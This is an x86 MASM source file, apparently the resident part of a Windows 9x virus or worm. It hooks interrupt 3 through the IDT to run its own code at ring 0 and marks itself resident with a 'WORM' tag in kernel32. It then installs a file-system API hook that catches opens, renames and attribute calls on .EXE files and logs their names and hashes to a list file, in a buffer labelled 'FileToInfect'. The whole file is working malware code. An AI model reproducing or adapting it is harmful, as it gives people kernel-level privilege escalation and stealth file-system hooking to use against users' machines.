   includelib kernel32.lib
   includelib user32.lib
   includelib wsock32.lib

   .486
   .model flat, stdcall

   include c:\masm\include\windows.inc
   include c:\masm\include\wsock32.inc
   include c:\masm\include\kernel32.inc
   include c:\masm\include\user32.inc


   NewIFSMgrSize                   equ     NewIFSMgrEnd-NewIFSMgr

   IFSMgr                          equ     0040h

   GetHeap                         equ     000dh
   FreeHeap                        equ     000eh

   Ring0_FileIO                    equ     0032h
   InstallFileSystemAPIhook        equ     0067h
   UniToBCSPath                    equ     0041h

   R0_OPENCREATFILE        equ 0D500h  ; Open/Create a file
   R0_READFILE                     equ     0D600h  ; Read a file, no context
   R0_WRITEFILE            equ 0D601h  ; Write to a file, no context
   R0_CLOSEFILE                    equ     0D700h

   IFSFN_FILEATTRIB                equ     33
   IFSFN_OPEN                      equ     36
   IFSFN_RENAME                    equ     37


   IFSFN_READ                      equ     0       ; read a file
   IFSFN_WRITE                     equ     1       ; write a file



   .data
           Kernel32                db      "kernel32",0
           MemPtr                  dd      0
           Temp                    dd      0
           DataSize                dd      0
           FullListFilename        db      300 dup (0)
           EndListFilename         db      "\listfile.txt",0

   .code

   GetResident:

           invoke  GetModuleHandle, offset Kernel32
           add     eax,6ch
           mov     ebx,'WORM'
           cmp     [eax],ebx

           jz      DontGoRing0
           mov     edi, eax

           sub     esp,8
           sidt    [esp]                           ; get interupt table

   ; hook int 3 to get get ring 0
           mov     esi,[esp+2]
           add     esi, 3*8                        ; pointer to int 3
           mov     ebx, [esi+4]

           mov     bx,word ptr [esi]               ; ebx = old pointer
           mov     eax,offset Ring0Code            ; eax = new pointer
           mov     word ptr [esi],ax               ; move new pointer to int 3
           shr     eax,16
           mov     word ptr [esi+6], ax

           pushad
           int     3                               ; get into ring 0
           popad
           mov     [esi],bx                        ; return old pointer again
           shr     ebx,16
           mov     [esi+6],bx
           add     esp,8

      DontGoRing0:
           ret



   ; ---------------------------------------
   ; -------------------------------- Ring 0
   ; ---------------------------------------

   vxdcall macro vxd_func
           int     20h
           dw      vxd_func
           dw      IFSMgr
   endm

   Ring0Code:
           mov     ebx,'WORM'
           mov     [edi],ebx

           mov     eax, NewIFSMgrSize+50000
           push    eax
           vxdcall GetHeap
           pop     ecx
           test    eax,eax
           jz      ErrorRing0

   ; Copy guide and decryptor to ring 0 mem
           sub     ecx, 50000

           mov     edi, eax
           mov     esi, NewIFSMgr
           rep     movsb

           sub     edi, 8
           mov     esi, MemPtr
           mov     ecx, DataSize
           rep     movsb

           mov     edi, eax
           sub     edi, NewIFSMgr
           add     edi, offset ListFilename
           lea     esi, FullListFilename
           mov     ecx, dword ptr [EndListFilename]
           rep     movsb

           push    eax
           vxdcall InstallFileSystemAPIhook
           pop     edi
           sub     edi,NewIFSMgr
           mov     [edi+BasePtr+1],edi
           mov     [edi+OldIFSMgr],eax
   ErrorRing0:
           iretd



   NewIFSMgr:
           push    ebx
   BasePtr:
           mov     ebx,66666666h

           xor     eax,eax
           inc     eax
           cmp     [Flag+ebx],eax
           jz      FileFunctionActive

           mov     [Flag+ebx],eax
           mov     eax,[esp+12]

           cmp     eax,IFSFN_OPEN
           jz      CheckFilename

           cmp     eax,IFSFN_FILEATTRIB
           jz      CheckFilename

           cmp     eax,IFSFN_RENAME
           jnz     FileFunctionEnd

      CheckFilename:

           mov     eax,[esp+16]

           test    eax,eax
           jz      FileFunctionEnd

           cmp     eax,25
           ja      FileFunctionEnd

           add     eax,'A'-1+':'*256


           mov     ecx,[esp+28]

           push    esi
           push    edi

           lea     esi,[FileToInfect+ebx]
           mov     word ptr [esi],ax

           inc     esi
           inc     esi

           mov     eax,[ecx+12]
           add     eax,4

           push    0
           push    250
           push    eax
           push    esi

           vxdcall UniToBCSPath
           add     esp,16

           xor     edx,edx
           mov     [esi+eax],edx
           mov     [esi+eax+4],edx

           cmp     dword ptr [esi+eax-4],'EXE.'
           jne     FileFunctionEndPop

           dec     esi
           dec     esi
           lea     ecx,[eax+3]                     ; ecx -> strlen+1
           push    ecx

           push    esi
         HashValue:
           lodsb
           and     al,00011111b                    ; al = 0 -> 31

           add     edx, eax
           rol     edx, cl
           loop    HashValue
           pop     esi

           mov     ecx,[HashCount+ebx]
           inc     ecx


           pop     eax
           cmp     ecx,990
           jae     FileFunctionEndPop

           lea     edi, [ebx+Hashes-4]
        LocateSameString:
           add     edi,4
           cmp     [edi],edx
           jz      FileFunctionEndPop
           dec     ecx
           jnz     LocateSameString
           mov     ecx,eax

           xchg    edi,ebx

           pushad
           mov     eax,R0_OPENCREATFILE
           push    2
           pop     ebx
           xor     ecx,ecx
           push    17
           pop     edx
           lea     esi, [ListFilename+edi]
           call    Ring0_File_IO
           mov     [MovEbxFileHandle+edi+1],eax
           popad
           jc      FileFunctionEndPopRetEbx

           mov     [ebx],edx

           push    ebx                             ; ebx -> Hash
           lea     ecx,[edi+HashCount]
           sub     ebx,ecx
           push    ebx                             ; ebx -> Hash in file

    MovEbxFileHandle:
           mov     ebx,10101010h

           push    eax
           push    esi
           push    eax

           mov     eax,R0_READFILE
           mov     ecx, 12
           xor     edx, edx
           lea     esi, [HashCount+edi]
           call    Ring0_File_IO

           pop     eax
           inc     dword ptr [esi]
           push    [esi+4]                         ; push end of file
           add     [esi+4],eax

           mov     eax,R0_WRITEFILE
           mov     ecx,12
           xor     edx,edx
           call    Ring0_File_IO
           pop     edx                             ; end of file
           pop     esi                             ; esi -> FileName
           pop     ecx                             ; filename length

           mov     eax,R0_WRITEFILE
           call    Ring0_File_IO

           pop     edx                             ; where in file to write
           pop     esi                             ; hash value
           mov     ecx,4
           mov     eax,R0_WRITEFILE
           call    Ring0_File_IO

           mov     eax,R0_CLOSEFILE
           call    Ring0_File_IO

   FileFunctionEndPopRetEbx:
           mov     ebx,edi

   FileFunctionEndPop:
           pop     edi
           pop     esi

   FileFunctionEnd:
           xor     edx,edx
           mov     [Flag+ebx],edx
   FileFunctionActive:
           mov     eax,[OldIFSMgr+ebx]
           mov     ecx,ebx

           pop     ebx

           pop     [ReturnFromHook+ecx]
           lea     edx,[ReturnFromHook+ecx+4]
           sub     [ReturnFromHook+ecx],edx

           call    dword ptr [eax]

           db      0e9h
     ReturnFromHook:
           dd      0

           jmp     eax

   Ring0_File_IO:
           vxdcall Ring0_FileIO
           ret


   OldIFSMgr               dd      0
   Flag                    dd      0
   ListFilename            db      300 dup (0)
   FileToInfect            db      300 dup (0)

   ListFileData:
   HashCount               dd      0
   NamesPtr                dd      4000
   NamesBegin      dd  0
   Hashes:
   NewIFSMgrEnd:

   KernelName      db  "kernel32",0

   Main:
       invoke  GetModuleHandleA, offset KernelName
       cmp eax,0bff70000h
       jnz Error



       invoke  GetCurrentDirectory, 270, offset FullListFilename
           add     eax,offset FullListFilename
           invoke  lstrcpy, eax, offset EndListFilename

           invoke  lstrlen, offset FullListFilename
           mov     dword ptr [EndListFilename], eax

           xor     esi,esi
           invoke  CreateFileA, offset FullListFilename, GENERIC_READ+GENERIC_WRITE, esi, esi, OPEN_ALWAYS, esi, esi
           mov     ebx,eax
           inc     eax
           jz      Error

           invoke  GetFileSize, ebx, esi
       .if eax == 0
           mov     eax,offset ListFileData
           mov     MemPtr, eax
           invoke  WriteFile, ebx, eax, 12, offset Temp, esi

       .else
           mov     DataSize, eax

           push    esi
           push    offset Temp
           push    eax

           invoke  LocalAlloc, LMEM_ZEROINIT, eax
           mov     MemPtr, eax

           push    eax
           push    ebx
           call    ReadFile

       .endif
           invoke  CloseHandle, ebx
           call    GetResident

       Error:
           invoke  ExitProcess,0

   end Main
